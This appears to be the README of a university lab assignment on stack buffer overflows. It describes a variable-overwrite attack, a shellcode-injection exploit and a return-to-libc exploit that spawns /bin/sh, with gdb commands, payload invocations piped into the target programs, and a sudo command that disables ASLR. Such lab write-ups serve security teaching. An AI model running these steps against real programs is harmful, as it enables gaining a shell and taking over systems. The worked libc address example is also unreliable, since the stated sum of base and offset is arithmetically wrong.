# 📘 Overview

This assignment explores exploiting buffer overflow vulnerabilities in two different scenarios: 

1. A simple buffer overflow that allows an attacker to execute shellcode.
2. A more advanced buffer overflow using the "return to libc" technique to execute shellcode.

---

## Buffer Overflow Exploit Steps

### Part 1: Changing the Grade

To alter the grade from `6` to any desired value, the buffer must be filled until the memory location of the `grade` variable is reached. A Python script generates a payload to change the grade, and this payload is stored as a binary file named `grade_change.txt`.

To execute the program and change the grade:

```bash
(cat grade_change.txt; cat) | ./GradeChanger
```

#### Special Case: Grade 10

For grade `10`, the program displays:

```bash
Hello, A...A, your grade is 0
```

Although the grade is `10`, the program misinterprets the hex value and prints `0`.

---

### Part 2: Simple Buffer Overflow

1. **Locate the Return Address**  
   Use the `gdb` debugger with a known input string to find the return address. Once identified, calculate the offset to the buffer.

2. **Find the Address of the Variable `Name`**  
   Since the buffer is non-executable, locate the executable memory address of the variable `Name`:

   ```bash
   p Name
   ```

   Use this address to overwrite the return address and execute the shellcode.

3. **Generate the Payload**  
   A Python script (`Buffer_Attack.py`) creates the payload, resulting in a binary file. Use the following command to run the exploit:

   ```bash
   (cat payload; cat) | ./Greeter
   ```

---

### Part 3: Return to libc Technique

To execute a shell using the "return to libc" technique, construct the following buffer structure:

```bash
| NOP sled | system | return address for system | /bin/sh |
```

#### Steps:

1. **Find Function and String Addresses**  
   Use `gdb` to locate necessary addresses:

   ```bash
   break main
   p system
   p exit
   info proc map
   ```

2. **Locate `/bin/sh` String Address**  
   From the output of `info proc map`, identify the libc library and find the offset of the string `/bin/sh`:

   ```bash
   strings -a -t x /usr/lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
   ```

   Combine the libc base address with the offset to compute the final address of `/bin/sh`.

   Example:

    ```bash
   libc base address: 0xf7d72000
   Offset: 0x1b3e9a
   Address of `/bin/sh`: 0xf7f36de8
   ```

3. **Verify the Address**  
   Confirm the computed address in `gdb`:

   ```bash
   x/s 0xf7f36de8
   ```

   The result should display:

   ```bash
   "/bin/sh"
   ```

4. **Generate and Execute the Payload**  
   Use Python to pack the addresses into a binary payload. Execute the program:

   ```bash
   (cat payload_secure; cat) | ./SecGreeter
   ```

#### Disable ASLR

For the exploit to succeed, Address Space Layout Randomization (ASLR) must be disabled:

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

---
